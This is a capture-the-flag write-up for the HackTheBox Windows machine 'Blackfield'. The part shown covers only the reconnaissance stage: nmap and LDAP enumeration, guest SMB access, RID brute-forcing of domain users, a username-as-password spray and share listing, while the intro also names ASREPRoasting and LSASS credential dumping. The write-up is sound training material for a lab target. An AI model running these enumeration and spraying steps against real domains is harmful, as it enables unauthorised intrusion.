# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Blackfield](https://www.hackthebox.com/machines/Blackfield)

<img src="https://labs.hackthebox.com/storage/avatars/7c69c876f496cd729a077277757d219d.png" alt="Blackfield Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟥 Hard (<span style="color:#e63c35;">5.9</span>)

> Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. Once user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.

#### Skills Required

- Basic Knowledge of Windows
- Basic Knowledge of Active Directory

#### Skills learned

- [Leveraging `Backup Operators` group membership](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)
- [Dumping credentials from LSASS](https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass)
- Anonymous / Guest Enumeration
- Removal of Windows Defender Antivirus Signatures
- Revert of Modified User NTLM Hash

#### Tools Used

- bloodhound
- bloodhound-python
- cipher.exe
- diskshadow.exe
- evil-winrm
- impacket-GetNPUsers
- impacket-psexec
- impacket-reg
- impacket-secretsdump
- impacket-smbserver
- impacket-wmiexec
- john
- ldapsearch
- mimikatz.exe
- netexec
- nmap
- pypykatz
- robocopy.exe
- SeBackupPrivilegeCmdLets.dll
- SeBackupPrivilegeUtils.dll
- smbclient
- wbadmin.exe
- windapsearch

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.22  netmask 255.255.254.0  destination 10.10.14.22
        inet6 dead:beef:2::1014  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::2082:c6a0:3cb9:9a5a  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1  bytes 48 (48.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.10.192`:
```
10.10.10.192 is alive ←
```

`sudo nmap -Pn -sSV -p- -T5 10.10.10.192`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 08:10 CET
Nmap scan report for 10.10.10.192
Host is up (0.070s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-10 14:16:08Z) ←
135/tcp  open  msrpc         Microsoft Windows RPC ←
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) ←
445/tcp  open  microsoft-ds? ←
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) ←
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 357.10 seconds
```

`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.10.192`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 08:16 CET
Nmap scan report for 10.10.10.192
Host is up (0.082s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7 ←
|       forestFunctionality: 7 ←
|       domainControllerFunctionality: 7 ←
|       rootDomainNamingContext: DC=BLACKFIELD,DC=local
|       ldapServiceName: BLACKFIELD.local:dc01$@BLACKFIELD.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
|       namingContexts: DC=BLACKFIELD,DC=local
|       namingContexts: CN=Configuration,DC=BLACKFIELD,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
|       namingContexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
|       namingContexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
|       isSynchronized: TRUE
|       highestCommittedUSN: 233564
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
|       dnsHostName: DC01.BLACKFIELD.local ←
|       defaultNamingContext: DC=BLACKFIELD,DC=local
|       currentTime: 20241110141609.0Z
|_      configurationNamingContext: CN=Configuration,DC=BLACKFIELD,DC=local
Service Info: Host: DC01; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
```

`echo -e '10.10.10.192\tdc01.blackfield.local blackfield.local blackfield' | sudo tee -a /etc/hosts`:
```
10.10.10.192    dc01.blackfield.local blackfield.local blackfield ←
```

`ldapsearch -x -H ldap://10.10.10.192/ -s 'base' 'namingContexts'`:
```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=BLACKFIELD,DC=local
namingContexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingContexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

`ldapsearch -x -H ldap://10.10.10.192/ -b "DC=blackfield,DC=local" '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <DC=blackfield,DC=local> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
❌

`windapsearch.py -d 'blackfield.local' --dc-ip 10.10.10.192`:
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.192
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=BLACKFIELD,DC=local
[+] Attempting bind
[+]     ...success! Binded as: ←
[+]      None ←

[*] Bye!
```

`windapsearch.py -d 'blackfield.local' --dc-ip 10.10.10.192 --users`:
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.192
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=BLACKFIELD,DC=local
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[!] Error retrieving users
[!] {'msgtype': 101, 'msgid': 3, 'result': 1, 'desc': 'Operations error', 'ctrls': [], 'info': '000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563'}
```
❌

`windapsearch.py -d 'blackfield.local' --dc-ip 10.10.10.192 -m 'Remote Management Users'`:
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.192
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=BLACKFIELD,DC=local
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None
[+] Attempting to enumerate full DN for group: Remote Management Users
[!] Error retrieving results
[!] {'msgtype': 101, 'msgid': 3, 'result': 1, 'desc': 'Operations error', 'ctrls': [], 'info': '000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563'}
```
❌

`netexec smb 10.10.10.192`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) ←
```

`netexec smb 10.10.10.192 -u '' -p ''`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\: ←
```

`netexec smb 10.10.10.192 -u '' -p '' --shares`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\: 
SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED ←
```
❌

`netexec smb 10.10.10.192 -u '' -p '' --users`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\: 
```
❌

`netexec smb 10.10.10.192 -u '' -p '' --rid-brute`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\: 
SMB         10.10.10.192    445    DC01             [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```
❌

`netexec smb 10.10.10.192 -u 'guest' -p ''`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest: ←
```

`netexec smb 10.10.10.192 -u 'guest' -p '' --shares`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest: 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ ←         
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share
```

`netexec smb 10.10.10.192 -u 'guest' -p '' --users`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest: 
```
❌

`netexec smb 10.10.10.192 -u 'guest' -p '' --rid-brute`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest: 
SMB         10.10.10.192    445    DC01             498: BLACKFIELD\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.10.192    445    DC01             500: BLACKFIELD\Administrator (SidTypeUser)
SMB         10.10.10.192    445    DC01             501: BLACKFIELD\Guest (SidTypeUser)
SMB         10.10.10.192    445    DC01             502: BLACKFIELD\krbtgt (SidTypeUser)
SMB         10.10.10.192    445    DC01             512: BLACKFIELD\Domain Admins (SidTypeGroup)
SMB         10.10.10.192    445    DC01             513: BLACKFIELD\Domain Users (SidTypeGroup)
SMB         10.10.10.192    445    DC01             514: BLACKFIELD\Domain Guests (SidTypeGroup)
SMB         10.10.10.192    445    DC01             515: BLACKFIELD\Domain Computers (SidTypeGroup)
SMB         10.10.10.192    445    DC01             516: BLACKFIELD\Domain Controllers (SidTypeGroup)
SMB         10.10.10.192    445    DC01             517: BLACKFIELD\Cert Publishers (SidTypeAlias)
SMB         10.10.10.192    445    DC01             518: BLACKFIELD\Schema Admins (SidTypeGroup)
SMB         10.10.10.192    445    DC01             519: BLACKFIELD\Enterprise Admins (SidTypeGroup)
SMB         10.10.10.192    445    DC01             520: BLACKFIELD\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.10.192    445    DC01             521: BLACKFIELD\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.10.192    445    DC01             522: BLACKFIELD\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.10.192    445    DC01             525: BLACKFIELD\Protected Users (SidTypeGroup)
SMB         10.10.10.192    445    DC01             526: BLACKFIELD\Key Admins (SidTypeGroup)
SMB         10.10.10.192    445    DC01             527: BLACKFIELD\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.10.192    445    DC01             553: BLACKFIELD\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.10.192    445    DC01             571: BLACKFIELD\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.10.192    445    DC01             572: BLACKFIELD\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.10.192    445    DC01             1000: BLACKFIELD\DC01$ (SidTypeUser)
SMB         10.10.10.192    445    DC01             1101: BLACKFIELD\DnsAdmins (SidTypeAlias)
SMB         10.10.10.192    445    DC01             1102: BLACKFIELD\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.10.192    445    DC01             1103: BLACKFIELD\audit2020 (SidTypeUser)
SMB         10.10.10.192    445    DC01             1104: BLACKFIELD\support (SidTypeUser)
SMB         10.10.10.192    445    DC01             1105: BLACKFIELD\BLACKFIELD764430 (SidTypeUser)
SMB         10.10.10.192    445    DC01             1106: BLACKFIELD\BLACKFIELD538365 (SidTypeUser)
SMB         10.10.10.192    445    DC01             1107: BLACKFIELD\BLACKFIELD189208 (SidTypeUser)

[...]
```

`netexec smb 10.10.10.192 -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{ print $6 }' | awk -F '\' '{ print $2 }' | grep -v 'BLACKFIELD' | tee ./domain_users.txt`:
```
Administrator
Guest
krbtgt
DC01$
audit2020
support
svc_backup
lydericlefebvre
PC01$
PC02$
PC03$
PC04$
PC05$
PC06$
PC07$
PC08$
PC09$
PC10$
PC11$
PC12$
PC13$
SRV-WEB$
SRV-FILE$
SRV-EXCHANGE$
SRV-INTRANET$
```

`netexec smb 10.10.10.192 -u 'guest' -p '' --rid-brute | grep 'SidTypeGroup' | awk -F '\' '{ print $2 }' | awk -F '(' '{ print $1 }' | tee ./domain_groups.txt`:
```
Enterprise Read-only Domain Controllers 
Domain Admins 
Domain Users 
Domain Guests 
Domain Computers 
Domain Controllers 
Schema Admins 
Enterprise Admins 
Group Policy Creator Owners 
Read-only Domain Controllers 
Cloneable Domain Controllers 
Protected Users 
Key Admins 
Enterprise Key Admins 
DnsUpdateProxy
```

`netexec smb 10.10.10.192 -u 'guest' -p '' --pass-pol`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest: 
```
❌

`netexec smb 10.10.10.192 -u ./domain_users.txt -p ./domain_users.txt --no-bruteforce --continue-on-success`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\DC01$:DC01$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\audit2020:audit2020 STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\support:support STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\svc_backup:svc_backup STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\lydericlefebvre:lydericlefebvre STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC01$:PC01$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC02$:PC02$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC03$:PC03$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC04$:PC04$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC05$:PC05$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC06$:PC06$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC07$:PC07$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC08$:PC08$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC09$:PC09$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC10$:PC10$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC11$:PC11$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC12$:PC12$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\PC13$:PC13$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\SRV-WEB$:SRV-WEB$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\SRV-FILE$:SRV-FILE$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\SRV-EXCHANGE$:SRV-EXCHANGE$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\SRV-INTRANET$:SRV-INTRANET$ STATUS_LOGON_FAILURE
```
❌

`cat ./domain_users.txt | awk '{ print tolower($0) }' | tee ./domain_users_lowercase.txt`:
```
administrator
guest
krbtgt
dc01$
audit2020
support
svc_backup
lydericlefebvre
pc01$
pc02$
pc03$
pc04$
pc05$
pc06$
pc07$
pc08$
pc09$
pc10$
pc11$
pc12$
pc13$
srv-web$
srv-file$
srv-exchange$
srv-intranet$
```

`netexec smb 10.10.10.192 -u ./domain_users_lowercase.txt -p ./domain_users_lowercase.txt --no-bruteforce --continue-on-success`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\guest:guest STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\dc01$:dc01$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\audit2020:audit2020 STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\support:support STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\svc_backup:svc_backup STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\lydericlefebvre:lydericlefebvre STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc01$:pc01$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc02$:pc02$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc03$:pc03$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc04$:pc04$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc05$:pc05$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc06$:pc06$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc07$:pc07$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc08$:pc08$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc09$:pc09$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc10$:pc10$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc11$:pc11$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc12$:pc12$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\pc13$:pc13$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\srv-web$:srv-web$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\srv-file$:srv-file$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\srv-exchange$:srv-exchange$ STATUS_LOGON_FAILURE 
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\srv-intranet$:srv-intranet$ STATUS_LOGON_FAILURE
```
❌

`smbclient -U 'guest' --password='' '//10.10.10.192/profiles$'`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jun  3 18:47:12 2020
  ..                                  D        0  Wed Jun  3 18:47:12 2020
  AAlleni                             D        0  Wed Jun  3 18:47:11 2020
  ABarteski                           D        0  Wed Jun  3 18:47:11 2020
  ABekesz                             D        0  Wed Jun  3 18:47:11 2020
  ABenzies                            D        0  Wed Jun  3 18:47:11 2020

[...]

  ZScozzari                           D        0  Wed Jun  3 18:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 18:47:12 2020
  ZWausik                             D        0  Wed Jun  3 18:47:12 2020

                5102079 blocks of size 4096. 1690401 blocks available
```

`netexec smb 10.10.10.192 -u 'guest' -p '' --shares -M spider_plus`:
```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest: 
SPIDER_PLUS 10.10.10.192    445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.10.192    445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.10.192    445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.10.192    445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.10.192    445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.10.192    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.10.192    445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share 
SPIDER_PLUS 10.10.10.192    445    DC01             [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.10.192.json". ←
SPIDER_PLUS 10.10.10.192    445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, forensic, IPC$, NETLOGON, profiles$, SYSVOL)
SPIDER_PLUS 10.10.10.192    445    DC01             [*] SMB Readable Shares:  2 (IPC$, profiles$)
SPIDER_PLUS 10.10.10.192    445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.10.192    445    DC01             [*] Total folders found:  314
SPIDER_PLUS 10.10.10.192    445    DC01             [*] Total files found:    0
```

`cat /tmp/nxc_hosted/nxc_spider_plus/10.10.10.192.json`:
```json
{
    "profiles$": {} ←
}
```

`mkdir ./profiles_smbshare`

`smbclient -U 'guest' --password='' '//10.10.10.192/profiles$' -c 'prompt OFF;recurse ON;lcd /home/kali/profiles_smbshare;mget *'`:
```
```
❌

